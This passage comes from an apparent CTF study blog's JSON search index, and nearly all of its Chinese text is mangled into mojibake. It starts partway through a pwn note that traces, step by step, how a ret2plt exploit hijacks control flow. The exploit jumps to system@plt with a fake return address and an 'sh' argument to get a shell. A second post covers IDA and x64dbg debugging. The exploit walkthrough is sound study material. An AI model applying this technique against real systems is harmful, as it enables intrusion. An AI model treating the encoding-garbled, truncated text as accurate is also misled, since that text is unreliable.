ˆæŒ‡é’ˆä¸Šå‡ 4 å­—èŠ‚ã€‚ æ ˆå˜åŒ–ï¼š text 12esp -&gt; 0x08048722 ï¼ˆåŸ esp + 4ï¼‰esp + 4 -&gt; 0x080482ea ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰ 3. è¿›å…¥ system@plt åçš„æµç¨‹ (1) é¦–æ¬¡è°ƒç”¨ system@pltï¼ˆGOT æœªè§£æï¼‰ system@plt çš„ä»£ç ï¼š asm 1230x80484d0 &lt;system@plt&gt; jmp [0x804a024] ; è·³è½¬åˆ° GOT è¡¨ï¼ˆé¦–æ¬¡æŒ‡å‘ä¸‹ä¸€è¡Œï¼‰0x80484d6 &lt;system@plt+6&gt; push 0x30 ; é‡å®šä½åç§»0x80484db &lt;system@plt+11&gt; jmp 0x8048460 ; è·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨ jmp [0x804a024]ï¼š é¦–æ¬¡è°ƒç”¨æ—¶ï¼ŒGOT è¡¨ 0x804a024 ä¸­çš„å€¼ä¸º 0x80484d6ï¼ˆå³ system@plt+6ï¼‰ï¼Œå› æ­¤ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚ push 0x30ï¼š esp = esp - 4 â†’ æ ˆæŒ‡é’ˆä¸‹é™ 4 å­—èŠ‚ã€‚ [esp] = 0x30 â†’ å°† 0x30 å‹æ ˆã€‚ æ ˆå˜åŒ–ï¼š text 123esp -&gt; 0x30 ï¼ˆæ–°å‹å…¥çš„å€¼ï¼‰esp + 4 -&gt; 0x08048722 ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰esp + 8 -&gt; 0x080482ea ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰ jmp 0x8048460ï¼š è·³è½¬åˆ°åŠ¨æ€é“¾æ¥å™¨ï¼ˆ_dl_runtime_resolveï¼‰ï¼Œè§£æ system çš„çœŸå®åœ°å€å¹¶æ›´æ–° GOT è¡¨ã€‚ *(2) åŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆå åŠ¨æ€é“¾æ¥å™¨ä¼šå°† system çš„çœŸå®åœ°å€å†™å…¥ GOT è¡¨ 0x804a024ã€‚ åç»­è·³è½¬åˆ° system çš„çœŸå®ä»£ç ã€‚ 4. æ‰§è¡Œ system å‡½æ•°æ—¶ (1) system çš„è°ƒç”¨çº¦å®šï¼ˆcdeclï¼‰ å‚æ•°é€šè¿‡æ ˆä¼ é€’ï¼š call system ä¼šéšå¼å‹å…¥è¿”å›åœ°å€ï¼ˆä½†ä½ çš„æ¼æ´åˆ©ç”¨ç›´æ¥è·³è½¬åˆ° system@pltï¼Œæœªé€šè¿‡ callï¼‰ã€‚ å‚æ•°ä½äº esp + 4ï¼ˆå› ä¸º esp æŒ‡å‘è¿”å›åœ°å€ï¼‰ã€‚ ä½ çš„åœºæ™¯ï¼š åŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆåï¼Œç›´æ¥è·³è½¬åˆ° system çš„çœŸå®ä»£ç ã€‚ æ­¤æ—¶æ ˆå¸ƒå±€ï¼š text 12esp -&gt; 0x08048722 ï¼ˆä¼ªé€ çš„è¿”å›åœ°å€ï¼‰esp + 4 -&gt; 0x080482ea ï¼ˆå‚æ•° &quot;sh&quot;ï¼‰ system ä¼šä» esp + 4 è¯»å–å‚æ•°ï¼ˆå³ 0x080482eaï¼‰ï¼Œæ‰§è¡Œ system(&quot;sh&quot;)ã€‚ (2) system æ‰§è¡Œåçš„æ ˆå¹³è¡¡ å¦‚æœæ˜¯æ­£å¸¸ call systemï¼Œè°ƒç”¨è€…éœ€é€šè¿‡ add esp, 4 æ¸…ç†å‚æ•°ã€‚ ä½†ä½ çš„æ¼æ´åˆ©ç”¨ä¸­ï¼š é€šè¿‡ ret è·³è½¬åˆ° system@pltï¼Œæœªæ˜¾å¼ä½¿ç”¨ callã€‚ system æ‰§è¡Œå®Œæ¯•åä¼šè¿”å›åˆ° 0x08048722ï¼ˆä¼ªé€ çš„åœ°å€ï¼‰ã€‚ 5. å…¨ç¨‹ esp å˜åŒ–æ€»ç»“ æ­¥éª¤ esp å˜åŒ– æ ˆå¸ƒå±€ï¼ˆæ ˆé¡¶å‘ä¸‹ï¼‰ æ‰§è¡Œ ret å‰ esp â†’ 0x80484d0 [0x80484d0, 0x08048722, 0x080482ea] æ‰§è¡Œ ret esp += 4 â†’ 0x08048722 [0x08048722, 0x080482ea] system@plt ä¸­ push 0x30 esp -= 4 â†’ 0x30 [0x30, 0x08048722, 0x080482ea] åŠ¨æ€é“¾æ¥å™¨è§£æå®Œæˆ esp æ¢å¤ä¸º 0x08048722 [0x08048722, 0x080482ea] system è¯»å–å‚æ•° ä» esp + 4 è¯»å– 0x080482ea å‚æ•° &quot;sh&quot; è¢«æ­£ç¡®ä¼ é€’ 6. å…³é”®ç»“è®º ret ç›´æ¥ä¿®æ”¹ eip å’Œ espï¼š é€šè¿‡å¼¹å‡ºè¿”å›åœ°å€å®ç°æ§åˆ¶æµåŠ«æŒï¼Œesp ä¼š +4ã€‚ system çš„å‚æ•°ä¼ é€’ä¾èµ–æ ˆå¸ƒå±€ï¼š ç¡®ä¿ ret åï¼Œesp + 4 æŒ‡å‘å‚æ•°åœ°å€ï¼ˆä½ çš„ payload å·²æ»¡è¶³ï¼‰ã€‚ åŠ¨æ€é“¾æ¥çš„é¢å¤–æ ˆæ“ä½œï¼š é¦–æ¬¡è°ƒç”¨ PLT æ—¶ä¼šæœ‰ push 0x30ï¼Œesp ä¼š -4ï¼Œä½†æœ€ç»ˆä¸å½±å“å‚æ•°ä½ç½®ã€‚ é€šè¿‡æ§åˆ¶ ret åçš„æ ˆå¸ƒå±€ï¼Œä½ æˆåŠŸå°† &quot;sh&quot; ä¼ é€’ç»™ systemï¼Œæœ€ç»ˆè·å– shellã€‚","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"}]},{"title":"idaä½¿ç”¨+åŠ¨è°ƒ","slug":"idaä½¿ç”¨-åŠ¨è°ƒ","date":"2025-03-19T11:50:43.000Z","updated":"2025-08-30T11:56:04.257Z","comments":true,"path":"2025/03/19/idaä½¿ç”¨-åŠ¨è°ƒ/","permalink":"http://example.com/2025/03/19/ida%E4%BD%BF%E7%94%A8-%E5%8A%A8%E8%B0%83/","excerpt":"","text":"idaåŠ¨æ€è°ƒè¯•æ–­ç‚¹ä¸€èˆ¬æ‰“çš„éƒ½æ˜¯è½¯ä»¶æ–­ç‚¹ ç¡¬ä»¶æ–­ç‚¹çš„è®¾æ³•ï¼šæ‰“å¥½æ–­ç‚¹å æ‰“å¼€æ‰¾åˆ°åˆšæ‰æ‰“ä¸‹çš„æ–­ç‚¹åå³é”®Editç¼–è¾‘å‹¾é€‰Hardware å·®åˆ«ï¼š 1. å®ç°åŸç†ï¼š è½¯ä»¶æ–­ç‚¹ï¼š è½¯ä»¶æ–­ç‚¹æ˜¯é€šè¿‡ä¿®æ”¹ç¨‹åºæŒ‡ä»¤æ¥å®ç°çš„ã€‚åœ¨ä»£ç ä¸­æ’å…¥ä¸€ä¸ªç‰¹å®šçš„ä¸­æ–­æŒ‡ä»¤ï¼ˆä¾‹å¦‚ï¼Œåœ¨x86æ¶æ„ä¸­æ˜¯INT 3æŒ‡ä»¤ï¼‰ã€‚ è°ƒè¯•å™¨ä¼šè®°å½•è¢«æ›¿æ¢çš„åŸå§‹æŒ‡ä»¤ï¼Œå¹¶åœ¨ç¨‹åºç»§ç»­æ‰§è¡Œæ—¶æ¢å¤å®ƒã€‚ ç¡¬ä»¶æ–­ç‚¹ï¼š ç¡¬ä»¶æ–­ç‚¹ä¸éœ€è¦ä¿®æ”¹ç¨‹åºä»£ç ã€‚ 2. èµ„æºé™åˆ¶ï¼š è½¯ä»¶æ–­ç‚¹ï¼š è½¯ä»¶æ–­ç‚¹åœ¨æ•°é‡ä¸Šæ²¡æœ‰ä¸¥æ ¼çš„é™åˆ¶ï¼Œå¯ä»¥åœ¨ç¨‹åºä¸­çš„ä»»æ„ä½ç½®è®¾ç½®ã€‚ ç¡¬ä»¶æ–­ç‚¹ï¼š CPUæä¾›çš„ç¡¬ä»¶æ–­ç‚¹å¯„å­˜å™¨æ•°é‡æœ‰é™ï¼Œå› æ­¤å¯ä»¥åŒæ—¶è®¾ç½®çš„ç¡¬ä»¶æ–­ç‚¹æ•°é‡ä¹Ÿæœ‰é™ã€‚ï¼ˆæœ€å¤šå››ä¸ªï¼‰ 3. ä½¿ç”¨åœºæ™¯ï¼š è½¯ä»¶æ–­ç‚¹ï¼š è½¯ä»¶æ–­ç‚¹é€‚ç”¨äºå¤§å¤šæ•°è°ƒè¯•åœºæ™¯ï¼Œç‰¹åˆ«æ˜¯åœ¨éœ€è¦è®¾ç½®å¤§é‡æ–­ç‚¹æ—¶ã€‚ ç¡¬ä»¶æ–­ç‚¹ï¼š ç¡¬ä»¶æ–­ç‚¹é€‚ç”¨äºä»¥ä¸‹åœºæ™¯ï¼š è°ƒè¯•æ— æ³•ä¿®æ”¹ä»£ç çš„ç¨‹åºï¼Œä¾‹å¦‚åªè¯»å†…å­˜ä¸­çš„ä»£ç ã€‚ è°ƒè¯•éœ€è¦ç²¾ç¡®æ§åˆ¶æ‰§è¡Œæµç¨‹çš„ç¨‹åºï¼Œä¾‹å¦‚å†…æ ¸ä»£ç æˆ–é©±åŠ¨ç¨‹åºã€‚ è°ƒè¯•æ•°æ®æ–­ç‚¹ï¼Œå°±æ˜¯å½“æŸä¸ªå†…å­˜åœ°å€è¢«è¯»å–æˆ–è€…å†™å…¥çš„æ—¶å€™å‡ºå‘æ–­ç‚¹ï¼Œè¿™æ˜¯ç¡¬ä»¶æ–­ç‚¹ç‰¹æœ‰çš„åŠŸèƒ½ã€‚ 4. éšè”½æ€§ï¼š è½¯ä»¶æ–­ç‚¹ï¼š è½¯ä»¶æ–­ç‚¹ä¼šä¿®æ”¹ç¨‹åºä»£ç ï¼Œå› æ­¤å¯èƒ½ä¼šè¢«ä¸€äº›åè°ƒè¯•æŠ€æœ¯æ£€æµ‹åˆ°ã€‚ ç¡¬ä»¶æ–­ç‚¹ï¼š ç¡¬ä»¶æ–­ç‚¹ä¸ä¼šä¿®æ”¹ç¨‹åºä»£ç ï¼Œå› æ­¤å…·æœ‰æ›´é«˜çš„éšè”½æ€§ã€‚ æ€»ç»“ï¼š è½¯ä»¶æ–­ç‚¹çµæ´»æ–¹ä¾¿ï¼Œé€‚ç”¨äºå¤§å¤šæ•°è°ƒè¯•åœºæ™¯ï¼Œä½†å¯èƒ½ä¼šè¢«åè°ƒè¯•æŠ€æœ¯æ£€æµ‹åˆ°ã€‚ ç¡¬ä»¶æ–­ç‚¹éšè”½æ€§é«˜ï¼Œé€‚ç”¨äºç‰¹æ®Šè°ƒè¯•åœºæ™¯ï¼Œä½†æ•°é‡æœ‰é™ æ¡ä»¶æ–­ç‚¹ æ¡ä»¶æ–­ç‚¹æ˜¯ä¸€ç§åœ¨è°ƒè¯•å™¨ä¸­è®¾ç½®çš„æ–­ç‚¹ï¼Œå®ƒä»…åœ¨æ»¡è¶³ç‰¹å®šæ¡ä»¶æ—¶æ‰ä¼šè§¦å‘ã€‚åœ¨æ¡†ä½ç½®è¾“å…¥æ¡ä»¶ æ›´æ”¹å­—èŠ‚é€‰ä¸­è¦æ›´æ”¹çš„é‚£ä¸ªå­—èŠ‚ å³é”® æ›´æ”¹ä¹‹åApply patch to åº”ç”¨è¿™ä¸ªè¡¥ä¸ [FlareOn6]Overlong elfæ–‡ä»¶åŠ¨æ€è°ƒè¯•1.æ‰¾åˆ°idaçš„æ ¹ç›®å½•ï¼Œæ‰¾åˆ°dbgsrvæ–‡ä»¶ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­æ‰¾åˆ° æ ¹æ®elfæ–‡ä»¶çš„è¿›åˆ¶é€‰æ‹©ï¼ˆä»¥64è¿›åˆ¶å’Œsnake.elfä¸ºä¾‹ï¼‰ å°†linux server64å’Œsnakeæ‹–å…¥æ–‡ä»¶å¤¹ä¸­ ä¹‹ååœ¨è™šæ‹Ÿæœºç»ˆç«¯å†…è¾“å‡ºchmod +x linux_server64èµ‹äºˆæ–‡ä»¶æ‰§è¡Œæƒåˆ© ä¹‹åè¾“å…¥./linux_server64è¿è¡Œæ–‡ä»¶ï¼ˆä¹‹åç­‰å¾…ä¸»æœºè¿æ¥ï¼‰ å†æ‰“å¼€ä¸€ä¸ªç»ˆç«¯è¾“å…¥ip addrè·å–è™šæ‹Ÿæœºipåœ°å€ æ£€æµ‹æ˜¯å¦å¯ä»¥æˆåŠŸï¼š æ‰“å¼€ä¸»æœºç»ˆç«¯è¾“å…¥ ping +è™šæ‹Ÿæœºip(ä¸‹å›¾å³ä¸ºæ¥è¿æ¥æˆåŠŸ) ä¹‹åæ‰“å¼€Debugger&gt;Process options&gt; 1:å¡«snakeåœ¨è™šæ‹Ÿæœºä¸­çš„ä½ç½® 2ï¼šå¡«snakeåœ¨è™šæ‹Ÿæœºæ‰€åœ¨æ–‡ä»¶çš„æ–‡ä»¶ä½ç½® 3ï¼šå¡«è™šæ‹Ÿæœºip 4:è¿è¡Œ.&#x2F;linux_server64åï¼Œè¾“å‡ºListening on 0.0.0.0:23946ï¼ˆä¸€èˆ¬é»˜è®¤ï¼‰ ä¹‹åå°±å¯ä»¥æ­£å¸¸è¿è¡Œï¼ˆä¸‹æ¬¡è¿è¡Œæ—¶åœ¨æ­¤è¿è¡Œ.&#x2F;linux_server64ï¼Œå¹¶æŠŠæ–‡ä»¶æ‹–å…¥æƒ³ç›¸åŒç›®å½•å³å¯ï¼‰ æ˜¾ç¤ºæ‰€æœ‰æœºå™¨ç ï¼šâ€‹ Options&gt;general&gt;æ”¹ä¸º10 x64dbgF2ï¼šè®¾ç½®æ–­ç‚¹ã€‚ï¼‰F4ï¼šè¿è¡Œåˆ°å…‰æ ‡å¤„F7ï¼šå•æ­¥æ­¥å…¥ã€‚ï¼ˆé‡åˆ°callæŒ‡ä»¤ï¼Œè¿›å…¥callå‡½æ•°çš„å®ç°å¤„ç»§ç»­æ‰§è¡Œæ±‡ç¼–æŒ‡ä»¤ï¼‰F8ï¼šå•æ­¥æ­¥è¿‡ã€‚ï¼ˆé‡åˆ°callæŒ‡ä»¤ï¼Œæ‰§è¡Œcallå‡½æ•°ï¼Œä¹‹åæ¥ç€æ‰§è¡ŒcallæŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼‰F9ï¼šè¿è¡Œç¨‹åºï¼ˆå¦‚æœæ²¡æœ‰ç¢°åˆ°æ–­ç‚¹ï¼Œç¨‹åºä¼šä¸€ç›´æ‰§è¡Œåˆ°ç»“æŸã€‚ï¼‰ Ctrl+F9: æ‰§è¡Œåˆ°å‡½æ•°è¿”å›å¤„ï¼Œç”¨äºè·³å‡ºå‡½æ•°å®ç° Alt+F9:æ‰§è¡Œåˆ°ç”¨æˆ·ä»£ç ï¼Œç”¨äºå¿«é€Ÿè·³å‡ºç³»ç»Ÿå‡½æ•° Ctrl+G:è¾“å…¥åå…­è¿›åˆ¶åœ°å€ï¼Œå¿«é€Ÿå®šä½åˆ°è¯¥åœ°å€å¤„","categories":[{"name":"re_study","slug":"re-study","permalink":"http://example.com/categories/re-study/"}],"tags":[{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"èŠ±æŒ‡ä»¤","slug":"èŠ±æŒ‡ä»¤","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"}]}],"categories":[{"name":"heap_study","slug":"heap-study","permalink":"http://example.com/categories/heap-study/"},{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"},{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"},{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"},{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"},{"name":"exercise_re","slug":"exercise-re","permalink":"http://example.com/categories/exercise-re/"},{"name":"re_study","slug":"re-study","permalink":"http://example.com/categories/re-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"},{"name":"unlink","slug":"unlink","permalink":"http://example.com/tags/unlink/"},{"name":"UAF","slug":"UAF","permalink":"http://example.com/tags/UAF/"},{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"},{"name":"SROP","slug":"SROP","permalink":"http://example.com/tags/SROP/"},{"name":"csu","slug":"csu","permalink":"http://example.com/tags/csu/"},{"name":"æ ˆè¿ç§»","slug":"æ ˆè¿ç§»","permalink":"http://example.com/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/"},{"name":"orw","slug":"orw","permalink":"http://example.com/tags/orw/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"},{"name":"code","slug":"code","permalink":"http://example.com/tags/code/"},{"name":"raxæ›¿ä»£","slug":"raxæ›¿ä»£","permalink":"http://example.com/tags/rax%E6%9B%BF%E4%BB%A3/"},{"name":"gdb","slug":"gdb","permalink":"http://example.com/tags/gdb/"},{"name":"Canaryç»•è¿‡","slug":"Canaryç»•è¿‡","permalink":"http://example.com/tags/Canary%E7%BB%95%E8%BF%87/"},{"name":"å°ç«¯åº","slug":"å°ç«¯åº","permalink":"http://example.com/tags/%E5%B0%8F%E7%AB%AF%E5%BA%8F/"},{"name":"one_gadget","slug":"one-gadget","permalink":"http://example.com/tags/one-gadget/"},{"name":"mprotect","slug":"mprotect","permalink":"http://example.com/tags/mprotect/"},{"name":"é™æ€ç¼–è¯‘","slug":"é™æ€ç¼–è¯‘","permalink":"http://example.com/tags/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91/"},{"name":"fini_array","slug":"fini-array","permalink":"http://example.com/tags/fini-array/"},{"name":"åˆ†å­—èŠ‚","slug":"åˆ†å­—èŠ‚","permalink":"http://example.com/tags/%E5%88%86%E5%AD%97%E8%8A%82/"},{"name":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","permalink":"http://example.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"ret2libc-printf","slug":"ret2libc-printf","permalink":"http://example.com/tags/ret2libc-printf/"},{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"èŠ±æŒ‡ä»¤","slug":"èŠ±æŒ‡ä»¤","permalink":"http://example.com/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"name":"TEA","slug":"TEA","permalink":"http://example.com/tags/TEA/"},{"name":"SMC","slug":"SMC","permalink":"http://example.com/tags/SMC/"}]}